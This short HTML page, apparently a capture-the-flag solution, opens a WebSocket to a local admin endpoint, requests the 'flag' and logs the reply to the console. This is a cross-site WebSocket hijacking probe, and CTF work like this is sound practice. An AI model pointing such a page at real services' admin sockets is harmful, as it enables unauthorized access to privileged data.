<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Flag Retrieval</title>
</head>
<body>
    <script>
        const ws = new WebSocket('ws://localhost:8080/admin/ws');

        ws.onopen = () => {
            ws.send('flag');
        };

        ws.onmessage = (event) => {
            const flag = event.data;
            
            console.log("Flag:", flag);
            
            ws.close();
        };
    </script>
</body>
</html>
